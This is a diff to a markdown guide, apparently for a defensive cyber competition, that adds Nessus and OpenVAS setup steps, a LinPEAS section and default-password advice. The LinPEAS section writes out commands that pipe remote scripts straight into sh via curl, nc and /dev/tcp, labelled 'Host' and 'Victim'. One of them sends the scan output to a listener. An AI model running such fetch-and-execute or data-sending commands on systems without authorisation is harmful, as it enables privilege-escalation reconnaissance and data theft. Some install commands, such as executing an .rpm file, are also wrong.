@@ -149,7 +149,48 @@ Open Workstation and navigate to "File > New Virtual Machine" or click "ctrl + N
 # Preparing for the Competition
 
 ## Scanning for Vulnerabilities
-There a variety tools available for you to use that can streamline the process of hunting for vulnerabilities. One of which is OpenVas by Greenbone and within its trial provides you with a virtual machine that makes the set up process easy. Navigate to https://www.greenbone.net/en/testnow/#toggle-id-1 to begin downloading.
+There a variety tools available for you to use that can streamline the process of hunting for vulnerabilities.
+
+### Nessus
+Nessus is an enterprise tool that is quite reputable and is widely used within the industry. Nessus offers a free 30 day trial on their popular vulnerability scanner. It's limited compared to the commercial version but still provides valuable vulnerability scanning capabilities. Visit https://www.tenable.com/downloads/nessus?loginAttempted=true to download you have the option to choose from a preformatted virtual machine file or download the file directly to the host.
+
+
+1. Run the Installer
+  For Windows:
+  -  Double-click the downloaded .exe file and follow the on-screen instructions.
+    
+  For Linux:
+  -  Open a terminal, navigate to the download directory, and run the following commands:
+
+    sudo chmod +x Nessus-*.rpm (or .deb)
+   
+    sudo ./Nessus-*.rpm (or .deb
+
+
+2. Start the Nessus Service
+
+  On Windows:
+  -   the Nessus service should start automatically after installation.
+    
+  On Linux:
+  -  start the Nessus service with the following command:
+    
+    sudo /etc/init.d/nessusd start
+
+3. Open a web browser and go to https://localhost:8834
+4. Follow the on-screen instructions to register your Nessus installation and activate your license.
+5. After activation, you will be prompted to create an admin user account.
+6. Provide a username and password, then click "Submit".
+7. Log in to the Nessus web interface using the admin account you just created.
+8.  Click "Scans" in the left-hand menu, then click "New Scan" to create a new scan.
+9.   Configure the scan settings as needed, then click "Launch Scan" to begin the vulnerability assessment.
+
+
+
+
+### OpenVAS
+OpenVAS is a comprehensive vulnerability scanning tool that detects security issues in your network and provides solutions to address them. It's open-source and offers a wide range of features navigate to https://www.greenbone.net/en/testnow/#toggle-id-1 to begin downloading.
+
 1. Download the OVA file of the Greenbone Enterprise TRIAL.
 2. Launch Vmware
 4. In Vmware select File > Open… in the menu bar
@@ -187,19 +228,62 @@ There a variety tools available for you to use that can streamline the process o
 22. The web interface can be accessed by opening the web browser.
 23. Enter the IP address of the appliance’s web interface.
     
-     `Note: The IP address of the appliance’ s web interface can be displayed as follows:
+         Note: The IP address of the appliance’ s web interface can be displayed as follows:
         During the login to the GOS administration menu
-        By selecting About and pressing Enter in the GOS administration menu`
+        By selecting About and pressing Enter in the GOS administration menu
     
 24. Log in with the web administrator created during setup.
     
-     ` → The web interface is opened.`
+        → The web interface is opened.
 
 <img src="https://www.greenbone.net/wp-content/uploads/Main_Dashboard_EN.png" width="539" height="301">
 
- 
+### Linpeas
+LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.
+
+ From github
+
+    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+ Without curl
+  
+    python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+
+    python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+
+ Local network
+
+    sudo python3 -m http.server 80 #Host
+    curl 10.10.10.10/linpeas.sh | sh #Victim
+
+ Without curl
+
+    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+    cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+Excute from memory and send output back to the host
+
+    nc -lvnp 9002 | tee linpeas.out #Host
+    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+
+Use a linpeas binary
+
+    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+    chmod +x linpeas_linux_amd64
+    ./linpeas_linux_amd64
 
 ## Changing Default Passwords
+One of the most important tasks to take care upon first receiving your machines is to change all default passwords to the hosts on your network.
+
+### Windows
+Enter Ctrl+Alt+Delete and click change a password
+
+<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fhelp.sentrian.com.au%2Fwp-content%2Fuploads%2F2018%2F08%2Fclt-alt-del-winserver16-1.jpg&f=1&nofb=1&ipt=5b318dce91056915c4e99c1904c0e216d89925c30a05e008b14ddc8c429035ea&ipo=images">
+
+Choose a new and secure password unique to this host 
+
+<img src="https://kb.mlml.sjsu.edu/uploads/images/gallery/2019-02-Feb/scaled-840-0/image-1550688271601.png">
+
 ## Configuring Active Directory
 ## Configuring a Database
 ## Configuring a Firewall
